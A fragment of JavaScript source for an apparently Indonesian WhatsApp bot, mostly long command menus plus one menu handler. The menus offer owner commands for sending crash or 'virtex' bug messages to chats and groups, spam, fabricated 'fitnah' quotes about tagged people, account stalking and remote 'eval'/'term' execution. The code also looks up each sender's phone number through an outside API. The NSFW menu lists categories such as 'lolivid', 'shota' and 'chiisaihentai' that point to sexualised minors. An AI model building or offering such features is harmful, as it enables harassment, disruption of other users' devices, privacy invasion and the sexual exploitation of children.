› ${prefix}quotesimage (limit)
› ${prefix}katabijak (limit)
› ${prefix}randomnama (limit)
› ${prefix}meme (limit)
› ${prefix}darkjoke (limit)
› ${prefix}memeindo (limit)


*(TEXT PRO)*
› ${prefix}golden <teks>
› ${prefix}flower <teks>
› ${prefix}wooden <teks>
› ${prefix}burn <teks>
› ${prefix}glow <teks>
› ${prefix}summer <teks>
› ${prefix}neon <teks>
› ${prefix}coffeecup <teks>
› ${prefix}coffeecup2 <teks>
› ${prefix}battlefield <teks>|<teks>
› ${prefix}googletxt2 <teks>|<teks>
› ${prefix}transformer <teks>|<teks>
› ${prefix}write <teks>
› ${prefix}waifu <teks>
› ${prefix}phlogo <teks>|<teks>
› ${prefix}tfire <teks>
› ${prefix}phcomment <teks>|<teks>
› ${prefix}wolf <teks>
› ${prefix}ytgol <teks>
› ${prefix}ytsilver <teks>
› ${prefix}t3d <teks>
› ${prefix}logoa <teks>|<teks>
› ${prefix}marvel <teks>|<teks>
› ${prefix}leavest <teks>
› ${prefix}neon2 <teks>
› ${prefix}wall <teks>
› ${prefix}notewrite <teks>
› ${prefix}pubglogo <teks>|<teks>


*(FUN)*
› ${prefix}fitnah (@tag)
› ${prefix}fitnahpc (+62)
› ${prefix}kontak (0|1)
› ${prefix}lolivid (limit)
› ${prefix}suit (batu/kertas gunting)
› ${prefix}toxic 
› ${prefix}flock (@tag)
› ${prefix}pantun (limit)
› ${prefix}dadu
› ${prefix}asupan (limit)
› ${prefix}viewonce (limit)
› ${prefix}detikvn number (limit)
› ${prefix}detikvideo number (limit)
› ${prefix}hbd (limit)


*(STALKING*)
› ${prefix}igstalk <username> (limit)
› ${prefix}mlstalk <username> (limit)
› ${prefix}tkstalk <username> (limit)
› ${prefix}githubstalk <username> (limit)
› ${prefix}tiktokstalk <username> (limit)
› ${prefix}shortlink <link> (limit)
› ${prefix}iguser <username> (limit)


*(ASUPAN)*
› ${prefix}asupan (limit)
› ${prefix}asupanloli (limit)
› ${prefix}asupangeayubi (limit)
› ${prefix}asupanaura (limit)
› ${prefix}asupanbunga (limit)
› ${prefix}asupanayu (limit)
› ${prefix}asupancaca (limit)
› ${prefix}xnxx <link> (limit)


*(NSFW)*
› ${prefix}yuri (limit)
› ${prefix}hentai (limit)
› ${prefix}anal (limit)
› ${prefix}eroneko (limit)
› ${prefix}lesbian (limit)
› ${prefix}kitsune (limit)
› ${prefix}bj (limit)
› ${prefix}pussy (limit)
› ${prefix}wallpaper (limit)
› ${prefix}neko2 (limit)
› ${prefix}baka (limit)
› ${prefix}slap (limit)
› ${prefix}poke (limit)
› ${prefix}keta (limit)
› ${prefix}awoo (limit)
› ${prefix}blowjob (limit)
› ${prefix}megumin (limit)
› ${prefix}neko (limit)
› ${prefix}trapnime (limit)
› ${prefix}art (limit)
› ${prefix}bts (limit)
› ${prefix}exo (limit)
› ${prefix}elf (limit)
› ${prefix}shota (limit)
› ${prefix}shinobu (limit)
› ${prefix}megumin (limit)
› ${prefix}wallnime (limit)
› ${prefix}chiisaihentai (limit)
› ${prefix}blowjob (limit)
› ${prefix}yaoi (limit)
› ${prefix}ecchi (limit)
› ${prefix}ahegao (limit)
› ${prefix}hololewd (limit)
› ${prefix}sideoppai (limit)
› ${prefix}animefeets (limit)
› ${prefix}animebooty (limit)
› ${prefix}animethighss (limit)
› ${prefix}hentaiparadise (limit)
› ${prefix}animearmpits (limit)
› ${prefix}hentaifemdom (limit)
› ${prefix}lewdanimegirls (limit)
› ${prefix}biganimetiddies (limit)
› ${prefix}animebellybutton (limit)
› ${prefix}hentai4everyone (limit)
› ${prefix}ero (limit)
› ${prefix}cum (limit)
› ${prefix}feet (limit)
› ${prefix}lewd (limit)
› ${prefix}feed (limit)
› ${prefix}eron (limit)
› ${prefix}solo (limit)
› ${prefix}gasm (limit)
› ${prefix}poke (limit)
› ${prefix}holo (limit)
› ${prefix}tits (limit)
› ${prefix}kuni (limit)
› ${prefix}kiss (limit)
› ${prefix}erok (limit)
› ${prefix}smug (limit)
› ${prefix}baka (limit)
› ${prefix}solog (limit)
› ${prefix}feetg (limit)
› ${prefix}lewdk (limit)
› ${prefix}femdom (limit)
› ${prefix}cuddle (limit)
› ${prefix}eroyuri (limit)
› ${prefix}cum_jpg (limit)
› ${prefix}blowjob (limit)
› ${prefix}erofeet (limit)
› ${prefix}holoero (limit)
› ${prefix}classic (limit)
› ${prefix}erokemo (limit)
› ${prefix}fox_girl (limit)
› ${prefix}futanari (limit)
› ${prefix}lewdkemo (limit)
› ${prefix}wallpaper (limit)
› ${prefix}pussy_jpg (limit)
› ${prefix}kemonomimi (limit)
› ${prefix}nsfw_avatar (limit)
› ${prefix}ngif (limit)

Dipersembahkan oleh : @${owner}‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎  
`, buttons: [{ buttonId: `${prefix}owner`, buttonText: { displayText: 'Pemilik bot' }, type: 1 },{ buttonId: `${prefix}donasi`, buttonText: { displayText: 'Donasi' }, type: 1 },{ buttonId: `${prefix}syarat`, buttonText: { displayText: 'Rules' }, type: 1 }], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: fakemenu, contextInfo: {mentionedJid: [sender, owner]}}}, 'buttonsMessage')
break
case 'official':
       return reply('Official Group : https://chat.whatsapp.com/JVis47FKk6bAmIwTxtAYOx')
       break
case 'aRllmenu':
groups = itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await itsmevall.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        ptod = "62858157008612@s.whatsapp.net"
        dtod = '62858157008612'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await itsmevall.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `*╭─[ ALL MENU ]*
│_/\_ ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙊𝙒𝙉𝙀𝙍 
│_/\_ ${prefix}off
│_/\_ ${prefix}isbaileys
│_/\_ ${prefix}banchat
│_/\_ ${prefix}unbanchat
│_/\_ ${prefix}listbc
│_/\_ ${prefix}setcmd
│_/\_ ${prefix}delcmd
│_/\_ ${prefix}listcmd
│_/\_ ${prefix}restart
│_/\_ ${prefix}antidelete on|off
│_/\_ ${prefix}autoketik on|off
│_/\_ ${prefix}autoread gc in / gc off
│_/\_ ${prefix}autovn on|off
│_/\_ ${prefix}anticall on|off
│_/\_ ${prefix}getcaption
│_/\_ ${prefix}bugkatalog
│_/\_ ${prefix}buggc id grup
│_/\_ ${prefix}bugpc *only pc*
│_/\_ ${prefix}troliv1
│_/\_ ${prefix}troliv2 *total*
│_/\_ ${prefix}virtex
│_/\_ ${prefix}on
│_/\_ ${prefix}status
│_/\_ ${prefix}setthumb
│_/\_ ${prefix}settarget
│_/\_ ${prefix}setfakeimg
│_/\_ ${prefix}setreply
│_/\_ ${prefix}hacked nama
│_/\_ ${prefix}setprefix
│_/\_ ${prefix}mode /public-self/
│_/\_ ${prefix}term <code>
│_/\_ ${prefix}eval <code>
│_/\_ ${prefix}colongsw reply
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙂𝙍𝙐𝙋 
│_/\_ ${prefix}grup 
│_/\_ ${prefix}promote 
│_/\_ ${prefix}demote 
│_/\_ ${prefix}setdesc
│_/\_ ${prefix}setname
│_/\_ ${prefix}nsfw 1/0
│_/\_ ${prefix}kick 
│_/\_ ${prefix}add 
│_/\_ ${prefix}getbio
│_/\_ ${prefix}getname 
│_/\_ ${prefix}reminder 
│_/\_ ${prefix}listonline
│_/\_ ${prefix}sider reply
│_/\_ ${prefix}antilink on|off
│_/\_ ${prefix}tod
│_/\_ ${prefix}tospam jumlah
│_/\_ ${prefix}antihidetag on|off
│_/\_ ${prefix}antiviewonce on|off
│_/\_ ${prefix}antivirtex on|off
│_/\_ ${prefix}autojoin on|off
│_/\_ ${prefix}kickarea
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙈𝘼𝙆𝙀𝙍 
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}attp teks
│_/\_ ${prefix}fancytext teks
│_/\_ ${prefix}emoji 
│_/\_ ${prefix}halloween teks
│_/\_ ${prefix}vampire teks
│_/\_ ${prefix}codetxt teks
│_/\_ ${prefix}googletxt
│_/\_ ${prefix}spiderman teks
│_/\_ ${prefix}express teks
│_/\_ ${prefix}maker2d2 teks
│_/\_ ${prefix}maker2d3 teks
│_/\_ ${prefix}maker2d4 teks
│_/\_ ${prefix}golden teks
│_/\_ ${prefix}flower teks
│_/\_ ${prefix}dance
│_/\_ ${prefix}wooden teks
│_/\_ ${prefix}burn
│_/\_ ${prefix}glow teks
│_/\_ ${prefix}summer teks
│_/\_ ${prefix}neon teks
│_/\_ ${prefix}coffeecup teks
│_/\_ ${prefix}coffeecup2 teks
│_/\_ ${prefix}battlefield teks|teks
│_/\_ ${prefix}googletxt2 teks
│_/\_ ${prefix}transformer teks
│_/\_ ${prefix}nulis teks
│_/\_ ${prefix}text3d teks
│_/\_ ${prefix}warrior teks
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘾𝙊𝙉𝙑𝙀𝙍𝙏 
│_/\_ ${prefix}tomp3
│_/\_ ${prefix}tomp4
│_/\_ ${prefix}toimg
│_/\_ ${prefix}slow
│_/\_ ${prefix}fast
│_/\_ ${prefix}reverse
│_/\_ ${prefix}tourl
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿𝙀𝙍 
│_/\_ ${prefix}play query
│_/\_ ${prefix}ytmp4 link
│_/\_ ${prefix}ytmp3 link
│_/\_ ${prefix}video query
│_/\_ ${prefix}instagram link
│_/\_ ${prefix}twitter
│_/\_ ${prefix}facebook link
│_/\_ ${prefix}tiktokdl
│_/\_ ${prefix}tiktokmusic
│_/\_ ${prefix}ytsearch
│_/\_ ${prefix}play
│_/\_ ${prefix}ytmp3
│_/\_ ${prefix}ytmp4
│_/\_ ${prefix}igdl
│_/\_ ${prefix}fbdl
│_/\_ ${prefix}brainly
│_/\_ ${prefix}lirik
│_/\_ ${prefix}tiktoknowm
│_/\_ ${prefix}pinterest
│_/\_ ${prefix}spotifysearch
│ 
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙏𝘼𝙂 
│_/\_ ${prefix}hidetag
│_/\_ ${prefix}kontag
│_/\_ ${prefix}sticktag
│_/\_ ${prefix}totag
│
│  𝐒𝐞𝐚𝐫𝐜𝐡 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}kbbi
│_/\_ ${prefix}jarak
│_/\_ ${prefix}translate
│_/\_ ${prefix}infogempa
│_/\_ ${prefix}covidindo
│_/\_ ${prefix}covidglobal
│_/\_ ${prefix}wikipedia
│_/\_ ${prefix}playstore
│_/\_ ${prefix}kodepos
│_/\_ ${prefix}newsinfo
│_/\_ ${prefix}jadwaltv
│_/\_ ${prefix}cuaca
│_/\_ ${prefix}gimage
│_/\_ ${prefix}wallpapersearch
│_/\_ ${prefix}shopee
│_/\_ ${prefix}google
│
│ 𝐑𝐚𝐧𝐝𝐨𝐦 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}owner
│_/\_ ${prefix}sewabot
│_/\_ ${prefix}report
│_/\_ ${prefix}runtime
│_/\_ ${prefix}speed 
│_/\_ ${prefix}sc
│_/\_ ${prefix}rulesbot
│_/\_ ${prefix}sharelock
│
│  ⬣ 𝙁𝙄𝙏𝙐𝙍 𝙐𝙋𝙎𝙒 
│_/\_ ${prefix}upswteks
│_/\_ ${prefix}upswlokasi
│_/\_ ${prefix}upswsticker
│_/\_ ${prefix}upswimage
│_/\_ ${prefix}upswvideo
│_/\_ ${prefix}upswgif
│
│  𝐆𝐚𝐛𝐮𝐭 𝐌𝐞𝐧𝐮
│_/\_ ${prefix}suit
│_/\_ ${prefix}artinama
│_/\_ ${prefix}jodoh
│_/\_ ${prefix}tebakumur
│_/\_ ${prefix}weton
│_/\_ ${prefix}jadian
│_/\_ ${prefix}faktaunik
│_/\_ ${prefix}anime
│_/\_ ${prefix}truth
│_/\_ ${prefix}dare
│_/\_ ${prefix}dadu
│_/\_ ${prefix}tebakgambar
│_/\_ ${prefix}tembak udara 
│_/\_ ${prefix}tembak laut
│_/\_ ${prefix}tembak darat
│_/\_ ${prefix}slot
│_/\_ ${prefix}quotes
│_/\_ ${prefix}quotesanime
│_/\_ ${prefix}quotesdilan
│_/\_ ${prefix}quotesimage
│_/\_ ${prefix}katabijak
│_/\_ ${prefix}randomnama
│_/\_ ${prefix}meme
│_/\_ ${prefix}darkjoke
│_/\_ ${prefix}memeindo
│
│  ⬣ 𝙈𝘼𝙆𝙄𝙉𝙂 𝙁𝙀𝘼𝙏𝙐𝙍𝙀𝙎
│_/\_ ${prefix}sticker
│_/\_ ${prefix}swm author|packname
│_/\_ ${prefix}take author|packname
│_/\_ ${prefix}fdeface
│_/\_ ${prefix}emoji
│_/\_ ${prefix}golden text
│_/\_ ${prefix}flower text
│_/\_ ${prefix}wooden text
│_/\_ ${prefix}burn text
│_/\_ ${prefix}glow text
│_/\_ ${prefix}summer text
│_/\_ ${prefix}neon text
│_/\_ ${prefix}coffeecup text
│_/\_ ${prefix}coffeecup2 text
│_/\_ ${prefix}battlefield text|text
